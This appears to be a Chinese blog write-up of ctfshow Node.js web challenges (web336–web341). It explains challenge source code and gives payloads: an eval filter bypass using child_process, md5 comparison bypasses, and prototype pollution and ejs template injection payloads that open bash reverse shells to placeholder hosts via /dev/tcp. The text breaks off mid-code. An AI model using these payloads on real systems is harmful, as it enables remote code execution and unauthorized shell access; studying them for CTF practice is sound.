class="code"><pre><span class="line">__filename</span><br><span class="line">__dirname</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230130191842257.png" alt="image-20230130191842257"></p><p><img src="../images/image-20230130191908490.png" alt="image-20230130191908490"></p><p>简单点说就是<code>__filename</code>就是返回当前目录的所处的全路径，<code>dirname</code>就是返回当前文件所处的位置，不包含文件本身</p><p><img src="../images/image-20230130192136886.png" alt="image-20230130192136886"></p><p>然后就利用fs模块里边的readFileSync函数读取文件(在文章开头给的文档链接里边可以查到)</p><p><img src="../images/image-20230130192447476.png" alt="image-20230130192447476"></p><p>发现过滤了exec和load<strong>(查看index.js)</strong>发现的</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2B<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>这里的加号要进行url编码，就是编码为%2B(类似ssti用[]绕过.)</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>题目</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>上面的a,b都是利用get方法进行传参，不理解的nodejs代码的可以看一下下面这篇文章</p><p><a href="https://www.runoob.com/nodejs/node-js-get-post.html">nodejs的get和post</a></p><p>这里的话是nodejs的弱类型比较，第一次见</p><p>解题关键就在于怎么绕过这个判断了。</p><p>这里的思路是利用数组绕过。</p><p>nodejs的拼接问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+<span class="number">6</span>); <span class="comment">//56</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="number">6</span>,<span class="number">6</span>]); <span class="comment">//56,6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5&quot;</span>+[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;6&quot;</span>]); <span class="comment">//56,6</span></span><br></pre></td></tr></table></figure><p>这时候就有一种思路了，就是类似<code>[&#39;a&#39;]+flag===&#39;a&#39;+flag</code>这样的，比如flag是<code>flag&#123;123&#125;</code>，那么最后得到的都是<code>aflag[123&#125;</code>，因此这个也肯定成立：<code>md5([&#39;a&#39;]+flag)===md5(&#39;a&#39;+flag)</code>，同时也满足<code>a!==b</code>：</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=<span class="number">1</span>&amp;b[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里为了相等就是因为要使md5加密相等</p><p><strong>解法二</strong></p><p>还有一种思路。理解一下javascript的数组，会发现它相对来说，和python的列表更为相像，而不像php的数组，因为它只能是数字索引，那么如果传非数字索引呢？：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[x]=<span class="number">1</span>&amp;b[x]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>变成javascript中的对象了。而对象又有这样的特点：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;123&#125;&quot;</span>)</span><br><span class="line"><span class="comment">//返回的是： [object Object]flag&#123;123&#125;</span></span><br></pre></td></tr></table></figure><p>因此传入两个对象，进行变量拼接后得到的都是<strong>[object Object]ctfshow{xxxxxx}</strong>，再进行md5肯定也是相同的。本来我以为还需要让a对象和b对象的有不同的键或者虽然键全是相同的，但是有值不同，这样来满足a!==b，但是发现并不需要，因为甚至这样，返回的都是false：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b=&#123;</span><br><span class="line">    <span class="attr">x</span>:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a===b)</span><br><span class="line"><span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>感觉这部分就和java有点像了，两个对象直接比较并不是说比较属性啥的，而是通过引用（内存里的位置）比较的，因此自然a!==b。<br>这样的话值就可以不相等了，因为最后解析都是会解析 成<strong>Object</strong></p><h2 id="web338-原链污染"><a href="#web338-原链污染" class="headerlink" title="web338(原链污染)"></a>web338(原链污染)</h2><p>题目</p><p><img src="../images/image-20230130221831198.png" alt="image-20230130221831198"></p><p>可以看看p神写的文章</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">这篇</a></p><p>源码里的东西</p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>其中还require了一个utils/common</strong></p><p>然后就去查看一下，<strong>发现common.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>顺便在看的时候发现common.js和P神里面举例的JS可以说是一模一样</p><p>只要secert.ctfshow===’36dboy’就会打印出flag。考点是<strong>原型链污染</strong>，第一次接触</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils.copy(user,req.body);,这里就是突破口，通过给Object添加ctfshow的属性，使 if(secert.ctfshow===&#x27;36dboy&#x27;)返回ture即可</span><br></pre></td></tr></table></figure><p>因为comment.js代码就是nodejs污染</p><p><strong>payload</strong></p><p><img src="../images/image-20230130230002185.png" alt="image-20230130230002185"></p><h2 id="web339-模板渲染rce-原型链污染"><a href="#web339-模板渲染rce-原型链污染" class="headerlink" title="web339(模板渲染rce 原型链污染)"></a>web339(模板渲染rce 原型链污染)</h2><p>题目</p><p><img src="../images/image-20230131203939821.png" alt="image-20230131203939821"></p><p><strong>原型链污染都是依靠修改object下的参数进行污染，而创建的对象要想达到object这个对象的话，得使用proto</strong></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">username</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">password</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalUser</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这想要是<code>secert.ctfshow===flag</code>是不可能的事，那我们就只能想别的办法</p><p>这里给的源文件多出一个api.js</p><p><strong>api.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这里的话是在function函数中的模板渲染，也是可以同过原型链污染query进行模板渲染的rce</p><p>这个render函数实际上是渲染函数，会在出现特定请求的时候执行特定操作</p><p>经过测试，query参数的值是可以直接当做语句来执行的</p><p>先/login那里污染一下发包，然后再post访问一下/api即可。</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/[port] 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload中不用require的原因是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</span><br></pre></td></tr></table></figure><p>这里的话得在服务器的防火墙那添加监听端口，不然会监听不成功。</p><p><img src="../images/image-20230201184758003.png" alt="image-20230201184758003"></p><p>如果监听的是9999端口，就新开一个9999端口。</p><p><strong>第一步，新监听一个端口</strong></p><p><img src="../images/image-20230201184938137.png" alt="image-20230201184938137"></p><p><strong>第二步**</strong>(反弹shell)**</p><p>先/login那里污染一下发包，然后再post访问一下/api即可。</p><p><img src="../images/image-20230201185729072.png" alt="image-20230201185729072"></p><p>文中标记的地方要记得修改</p><p><img src="../images/image-20230201185805509.png" alt="image-20230201185805509"></p><p><img src="../images/image-20230201185855177.png" alt="image-20230201185855177"></p><p>监听端口出现这就代表成功了，这里访问api的原因是，因为在/logion里object类里修改了query的值，然后触发点在/api的代码里。</p><p><strong>解法二</strong></p><p>是利用ejs的模板引擎漏洞</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>解法步骤和上面一样，是先污染/login，然后在访问api</p><h2 id="web340-两层污染"><a href="#web340-两层污染" class="headerlink" title="web340(两层污染)"></a>web340(两层污染)</h2><p>题目</p><p><img src="../images/image-20230201190842269.png" alt="image-20230201190842269"></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>api.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230201191036822.png" alt="image-20230201191036822"></p><p>就是这里的不一样，这里想要修改isAdmin的值的话，得转到object，因经过测试，<code>userinfo.__proto__.__proto__` 才是 `Object</code> 对象。</p><p><img src="../images/image-20230201191809798.png" alt="image-20230201191809798"></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.11/11111 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>解法和上一题一样，先污染/login,然后在访问/api</p><h2 id="web341-两层污染加ejs"><a href="#web341-两层污染加ejs" class="headerlink" title="web341(两层污染加ejs)"></a>web341(两层污染加ejs)</h2><p>题目</p><p><img src="../images/image-20230201193633584.png" alt="image-20230201193633584"></p><p>这题和其他不同的是没有 <code>/api</code> 接口触发污染点了，所以使用 <code>ejs</code> RCE。</p><p>然后像 web340 一样污染要套两层。下面 EXP 也服务器监听端口是 <code>9999</code></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable 